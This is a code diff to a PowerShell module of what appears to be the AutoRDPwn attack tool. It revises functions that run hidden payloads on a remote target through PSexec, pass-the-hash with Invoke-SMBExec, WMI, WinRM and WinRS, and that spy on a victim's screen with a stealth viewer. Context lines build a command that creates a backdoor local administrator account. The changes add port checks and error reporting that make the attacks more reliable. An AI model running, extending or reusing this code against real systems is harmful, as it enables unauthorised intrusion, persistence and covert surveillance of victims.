@@ -6,18 +6,22 @@ function Get-ARAttackPayloadCommand {
 
 function Invoke-ARAttackPSexec {
     $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 445 -Purpose 'PSexec'
     Import-ARToolScript 'Resources\Scripts\Invoke-PSexec.ps1'
     $executable = Join-Path $script:ARTools 'psexec.exe'
     if (-not (Test-Path -LiteralPath $executable)) { throw 'PSexec could not be extracted.' }
     $user = Get-ARTargetUserName
     $password = ''
     if ($user -ne '') { $password = Get-ARPlainPassword }
+    $failures = 0
     foreach ($payload in @(Get-ARPayloads)) {
         $arguments = @("\\$target")
         if ($user -ne '') { $arguments += @('-u', $user, '-p', $password) }
         $arguments += @('-h', '-d', 'powershell.exe', '-windowstyle', 'hidden', $payload, '-nobanner', '-accepteula')
         & $executable @arguments 2>&1 | ForEach-Object { Write-Host $_ }
+        if ($LASTEXITCODE -ne 0) { $failures++ }
     }
+    if ($failures -gt 0) { Write-ARWarn ('PSexec failed on ' + $failures + ' payload(s), exit code ' + $LASTEXITCODE) }
     Set-ARStatus 'Payloads started with PSexec' 'Ok'
     Connect-ARTargetSession | Out-Null
     Invoke-ARShadowEngine | Out-Null
@@ -39,9 +43,12 @@ function Invoke-ARAttackPassTheHash {
         $command = Get-ARAttackPayloadCommand $payload
         Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $command 2>&1 | ForEach-Object { Write-Host $_ }
     }
-    $createUser = Get-ARText 'Pwn5' ''
-    if ($createUser -ne '') {
-        Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createUser 2>&1 | ForEach-Object { Write-Host $_ }
+    if ($script:ARCreateUser) {
+        $createUser = Get-ARText 'Pwn5' ''
+        if (-not [string]::IsNullOrWhiteSpace($createUser)) {
+            Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $createUser 2>&1 | ForEach-Object { Write-Host $_ }
+            if (-not $script:ARCreatedAccounts.Contains('AutoRDPwn')) { $script:ARCreatedAccounts.Add('AutoRDPwn') }
+        }
     }
     $hashUser = 'ARDP_' + [guid]::NewGuid().ToString('N').Substring(0, 8)
     $createHashUser = 'net user ' + $hashUser + ' AutoRDPwn /add & net localgroup Administrators ' + $hashUser + ' /add'
@@ -61,6 +68,7 @@ function Invoke-ARAttackPassTheHash {
 
 function Invoke-ARAttackWmi {
     $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 135 -Purpose 'WMI'
     $credential = Get-ARTargetCredential
     $parameters = @{ ComputerName = $target; ErrorAction = 'Stop' }
     if ($credential) { $parameters['Credential'] = $credential }
@@ -82,6 +90,7 @@ function Invoke-ARAttackWmi {
 
 function Invoke-ARAttackWinRm {
     $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WinRM'
     $credential = Get-ARTargetCredential
     foreach ($payload in @(Get-ARPayloads)) {
         $parameters = @{
@@ -103,6 +112,7 @@ function Invoke-ARAttackWinRm {
 
 function Invoke-ARAttackWinRs {
     $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'WinRS'
     $user = Get-ARTargetUserName
     $password = ''
     if ($user -ne '') { $password = Get-ARPlainPassword }
@@ -112,6 +122,7 @@ function Invoke-ARAttackWinRs {
         if ($user -ne '') { $arguments += @("/u:$user", "/p:$password") }
         $arguments += @('/noecho', '/noprofile', '/allowdelegate', $command)
         & winrs.exe @arguments 2>&1 | ForEach-Object { Write-Host $_ }
+        if ($LASTEXITCODE -ne 0) { Write-ARWarn ('winrs returned ' + $LASTEXITCODE) }
         Start-Sleep -Milliseconds 600
     }
     Set-ARStatus 'Payloads started with WinRS' 'Ok'
@@ -164,26 +175,18 @@ function Invoke-ARAttackRdp {
 
 function Invoke-ARAttackQuickScreen {
     $target = Get-ARTargetComputer
+    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Quick Screen'
     if ([string]::IsNullOrWhiteSpace($script:ARTarget['User'])) {
         if ($script:ARInvokedFromOption) { throw 'Quick Screen requires a target user.' }
         $script:ARTarget['User'] = Read-ARValue 'Target user' $env:USERNAME
     }
     $password = Get-ARPlainPassword
-    $attacker = [string]$script:ARTarget['AttackerIP']
-    if ([string]::IsNullOrWhiteSpace($attacker)) {
-        $localAddress = Get-ARLocalIPv4
-        if ($script:ARInvokedFromOption) {
-            if ([string]::IsNullOrWhiteSpace($localAddress)) { throw 'Quick Screen requires the attacker IP.' }
-            $attacker = $localAddress
-        }
-        else {
-            $attacker = Read-ARValue (Get-ARText 'txt123' 'Your IP for the reverse connection') $localAddress
-        }
-    }
+    # The frame server is pulled from the target, so no dial-back address is
+    # needed here. Keep the field fresh for the attacks that do stage back.
+    $routeAddress = Get-ARLocalIPv4 -Target $target
+    if (-not [string]::IsNullOrWhiteSpace($routeAddress)) { $script:ARTarget['AttackerIP'] = $routeAddress }
     $viewOnly = ([string]$script:ARTarget['Mode'] -eq 'view')
-    $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCViewer.ps1'
-    $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCServer.ps1'
     . (Get-ARResourcePath 'Resources\Scripts\Invoke-StealthScreen.ps1')
-    Invoke-StealthScreen -Target $target -User ([string]$script:ARTarget['User']) -Pass $password -Mode view -AttackerIP $attacker -Port 5500 -ViewOnly:$viewOnly
+    Invoke-StealthScreen -Target $target -User ([string]$script:ARTarget['User']) -Pass $password -Mode view -ViewOnly:$viewOnly
     Set-ARStatus 'Quick Screen finished' 'Ok'
 }
